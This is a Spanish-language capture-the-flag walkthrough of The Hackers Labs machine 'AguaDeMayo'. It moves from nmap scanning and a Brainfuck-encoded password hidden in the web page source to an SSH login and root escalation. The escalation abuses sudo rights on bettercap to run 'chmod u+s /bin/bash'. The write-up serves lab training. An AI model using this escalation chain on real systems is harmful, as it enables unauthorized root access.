---
description: >-
  ✍️ Autor: The Hackers Labs🔍 Dificultad: Fácil 📅 Fecha de creación:
  14/05/2024
---

# AguaDeMayo

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web por defecto del Apache.

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

Inspeccionando el código fuente descubrimos que hay algo comentado que al parecer es un tipo de código que pertenece a **Brainfuck** por lo que a través de esta página lo decodificamos a código **ASCII** [enlace](https://www.dcode.fr/brainfuck-language).

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

Al decodificarlo, obtenemos un valor que no sabemos si es un usuario o una contraseña. Hacemos **Fuzzing Web** para ver si podemos averiguar algo con el comando:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un directorio llamado **/images**, por lo que indagamos qué hay en él.

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

Para descargar la imagen y ver si hay información oculta, utilizamos el comando:

```bash
wget http://172.17.0.2/images/agua_ssh.jpg
```

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

Con el comando:

```bash
steghide extract -sf agua_ssh.jpg
```

intentamos extraer datos ocultos del archivo de imagen llamado **agua\_ssh.jpg** usando la herramienta **Steghide**, pero no tenemos suerte.

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

Con el comando:

```bash
exiftool agua_ssh.jpg
```

extraemos y mostramos los metadatos incrustados en la imagen, pero no encontramos información relevante.

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

Como ninguna de las herramientas de esteganografía tuvo éxito, intentamos usar **agua** como nombre de usuario para conectarnos a través de **SSH** con la contraseña que decodificamos anteriormente.

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

Ejecutamos el binario para obtener una especie de shell con el comando:

```bash
sudo -u root /usr/bin/bettercap
```

Una vez dentro, ejecutamos:

```bash
!chmod u+s /bin/bash
```

ya que esto nos permite ejecutar una **shell** con permisos elevados. Verificamos y confirmamos que ahora tenemos los máximos privilegios.

<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>
